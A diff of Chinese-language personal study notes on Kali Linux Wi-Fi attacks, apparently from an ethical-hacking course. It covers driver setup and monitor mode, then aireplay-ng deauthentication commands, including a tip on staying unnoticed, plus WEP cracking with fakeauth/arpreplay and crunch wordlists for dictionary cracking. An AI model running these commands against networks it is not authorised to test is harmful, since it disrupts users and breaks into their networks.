@@ -595,6 +595,23 @@ service wpa_supplicant stop
 
 airmon-ng start wlan0
 airodump-ng wlan0
+iwconfig 可以看到 Mode:monitor
+
+但是新版本好像wlan0的名字并同有修成wlan0mon
+![](images/2021-01-31-13-17-27.png)
+
+![](images/2021-01-31-13-19-06.png)
+
+其实 airmon-ng stop wlan0 后，这个 iwconfig能看到也还是 mode:monitor
+是不是没有连上卡，就是 mode:monitor？
+答：不是，因为重启后，是 Mode:Managed
+![](images/2021-01-31-13-28-40.png)
+
+说明没有关好，再确认 `airmon-ng stop wlan0` 可以看到是正确的
+![](images/2021-01-31-13-30-32.png)
+证明iwconfig的结果是可以做为是否正确开启monitor的参考的
+
+注： 在monitor模式下，右上角的无线是不能找到wifi的
 
 [rtl8812au kali linux下监听wifi方法与步骤](https://www.mzbky.com/458.html)
 
@@ -611,9 +628,9 @@ https://mlog.club/article/4237988
 oot@kali:/home/kali# iw dev wlan0 set type monitor
 
 这里卡死了
-
+这个原因可能是：
 [wifite自动化Wi-Fi渗透（RTL8812AU）](https://www.mzbky.com/3345.html)
-
+驱动：
 https://github.com/aircrack-ng/rtl8812au
 
 [kali linux下安装rtl8812au（Realtek RTL8812AU）网卡驱动方法与操作步骤](https://www.mzbky.com/248.html)
@@ -629,6 +646,30 @@ sudo apt-get install dkms
 apt install realtek-rtl88xxau-dkms
 apt dist-upgrade
 
+https://www.udemy.com/course/the-complete-ethical-hacking-course/learn/lecture/14075748#overview
+
+If you come across any problem while you try to connect your usb wi-fi card to your Kali Linux you may follow the steps below:
+
+1) Try to define your device within other USB ports rather than your current one within Virtualbox such as 1.0, usb 2.0 or usb 3.0.
+在usb管理中加入你的wifi网卡，不要光使用默认的usb设备
+2) Try to unplug usb wi-fi card from your computer and plug it in after Kali Linux starts only.
+先拨出网卡，等kali打开再插上
+3) Try to plug your usb wi-fi card to different physical USB ports on your physical computer.
+试着插别的usb插口
+4) Open Kali Linux settings from Virtualbox when Kali Linux is closed. Open Processor tab from System section. Make sure you make Enable PAE/NX option ticked.
+关闭kali，打开对应虚拟设置，确保系统->处理器里保证PAE/NX 已经打开
+
+[virtualbox的“启用PAE/NX”是什么意思？](https://zhidao.baidu.com/question/522605595)
+
+5) Run this command from terminal and restart Kali Linux
+
+sudo apt-get install linux-image-$(uname -r|sed 's,[^-]*-[^-]*-,,') linux-headers-$(uname -r|sed 's,[^-]*-[^-]*-,,') broadcom-sta-dkms
+升级linux内核和网卡驱动，命令如下
+
+6) If none of these works you may search for Kali Linux drivers for your usb wi-fi card and find your documentation online to install them on your Kali Linux. This is not necessary for most of the usb wi-fi cards however there might be some cases that you need to install this.
+
+7) If nothing above works you should search for your specific usb wi-fi card model and chipset with google such as "Ralink 3070 Kali Linux connection" in order to find simple solutions. If you come across with comments stating your device does not work with Kali then you are going to refund it and find another one that works unfortunately.
+
 ### 高清屏设置
 
 [最新版 Kali 2020.3 高DPI 缩放，桌面文字太小怎么调？](https://blog.csdn.net/vanarrow/article/details/108893868)
@@ -637,3 +678,121 @@ apt dist-upgrade
 
 [使用Kali Linux 暴力破解wifi密码详细步骤](https://www.mzbky.com/327.html)
 
+airodump-ng wlan0
+airodump --channel 9 --bssid xx:xx:xx:xx --write test1 wlan0
+获取包数据
+wireshark找开 .cap
+
+推人下线
+aireplay-ng --deauth 1000 -a xx:xx:xx:xx wlan0
+aireplay-ng --deauth 1000 -a xx -c xx:xx:xx:xx wlan0
+-c <target>
+--deauth <packets>
+  5-10 可能下线，而让对方不察觉
+  1000 对方可以明显看到下线
+-a <ap> 就是路由器
+
+airodump-ng wlan0
+ 60:3A:7C:B3:ED:66  -48        1        0    0 161 1300   WPA2 CCMP   PSK  azhao                                                               
+
+airodump-ng --bssid 60:3A:7C:B3:ED:66 --write test1 wlan0
+airodump-ng --channel 1 --bssid 60:3A:7C:B3:ED:66 --write test1 wlan0
+airodump-ng --channel 161 --bssid 60:3A:7C:B3:ED:66 --write test1 wlan0
+60:3A:7C:B3:ED:66  1A:F8:0D:4C:17:D8  -32    0 -24     18       89                                                                            
+60:3A:7C:B3:ED:66  94:87:E0:20:0D:05  -47    0 - 6e     0        1 
+
+问题：为什么看不到我的电脑的？ LAPTOP-AZHAOHW
+答：有的时间就能看到，有点“随机”
+
+这是从路由器拿到的数据
+LAPTOP-AZHAOHW
+IP：192.168.0.104 | MAC：F8-E4-E3-AF-28-6E | 5G无线连接
+HONOR_V30_PRO-5041e620914
+IP：192.168.0.102 | MAC：1A-F8-0D-4C-17-D8 | 5G无线连接
+zhimi-airpurifier-m1_miio126876
+IP：192.168.0.100 | MAC：F0-B4-29-07-79-A4 | 2.4G无线连接
+MI8-azhaomi8
+IP：192.168.0.101 | MAC：94-87-E0-20-0D-05 | 5G无线连接
+
+aireplay-ng --deauth 1000 -a 60:3A:7C:B3:ED:66 -c 1A:F8:0D:4C:17:D8 wlan0
+60:3A:7C:B3:ED:66  -16      114        5    0 161 1300   WPA2 CCMP   PSK  azhao                                                               
+60:3A:7C:B3:ED:64  -30       46       16    0   1  540   WPA2 CCMP   PSK  azhao
+
+报错 bssid 不可用可以参考，加-D 处理
+[有关在使用aireplay-ng处理5Ghz频段的wifi时出现“No such Bssid available”的解决方法](https://my.oschina.net/u/4255339/blog/4429382)
+
+ aireplay-ng --deauth 1000 -a 60:3A:7C:B3:ED:66 -c 1A:F8:0D:4C:17:D8 -D wlan0
+ aireplay-ng --deauth 1000 -a 60:3A:7C:B3:ED:66 -c 94:87:E0:20:0D:05 -D wlan0
+ 对2G网络，有另外的 bssid
+ aireplay-ng --deauth 1000 -a 60:3A:7C:B3:ED:64 -c 1A:F8:0D:4C:17:D8 -D wlan0
+
+ 但问题：华为好像踢不下去。。。
+ 小米也不行
+ 是因为5G带宽太大吗？
+
+参考 Aircrack-ng 论坛 
+Aircrack-ng >General Category >Newbies >aireplay-ng: No such BSSID available but still detected.
+https://forum.aircrack-ng.org/index.php?topic=4077.0
+也可能是踢下去又上来了
+
+实践无线WI-FI破解
+http://flamingosw.blogspot.com/2009/11/wi-fi.html
+参考：
+https://item.taobao.com/item.htm?spm=a230r.1.14.29.6e0453f8Pb5U6B&id=561146988224&ns=1&abbucket=1#detail
+
+也还可以试一下这个，有更多可能的答案：（需要一个个试）
+Wifi渗透测试：为什么aireplay-ng de-authentication不起作用？
+https://answer-id.com/zh/63274967
+
+https://www.howtogeek.com/167783/htg-explains-the-difference-between-wep-wpa-and-wpa2-wireless-encryption-and-why-it-matters/
+
+### WEP cracking
+
+深入解析无线WEP和WPA密码及破解原理
+https://www.cnblogs.com/chinasun021/archive/2013/01/18/2866343.html
+WEP/WPA/WPA2加密标准有什么区别？
+https://blog.csdn.net/aristolto/article/details/79835652
+
+airodump-ng --bssid 60:3A:7C:B3:ED:66 --write test1 wlan0
+airodump-ng --channel 1 --bssid 60:3A:7C:B3:ED:66 --write test1 wlan0
+aircrack-ng <file_name>
+aircrack-ng test1.cap
+
+80:89:17:19:25:26  -80        2        0    0   6   54e. WEP  WEP         TP-LINK_2526                                                        
+ airodump-ng --channel 6 --bssid 80:89:17:19:25:26 --write wep wlan0
+
++ fakeauth
+airodump-ng --bssid 80:89:17:19:25:26 --channel 6 --write fakeauth wlan0
+
+
+ip addr 
+取 wlan0的 mac
+
+aireplay-ng --fakeauth 0 -a 80:89:17:19:25:26 -h xxx wlan0
+-a router mac
+-h wifi card mac
+
+Aircrack-ng之Aireplay-ng命令
+https://blog.csdn.net/qq_28208251/article/details/48115815
+解除认证攻击（-0）、伪造认证攻击（-1）、交互式数据包重放攻击（-2）、手动ARP请求注入攻击（-3）、ARP请求重放注入攻击（-4）
+
+aireplay-ng的攻擊模式
+http://atic-tw.blogspot.com/2014/01/aireplay-ng6.html
+
+Aircrack-ng 中文使用教程/Aireplay-ng
+https://www.wangan.com/docs/1398
+
++ arpreplay
+aireplay-ng --arpreplay -b <bssid> -h <wifi-card> wlan0
+aireplay-ng --fakeauth 0 -a 80:89:17:19:25:26 -h xxx wlan0
+
+这两个应该是可以回事破解WEP密码用的
+
+字典破解：
+crunch <min> <max> <char> -t <pattern> -o file
+crunch 8 10 123!'^+% -t m@@@p -file wordlist 
+
+aircrack-ng test1.cap -w wordlist
+
+
+## post connection attack
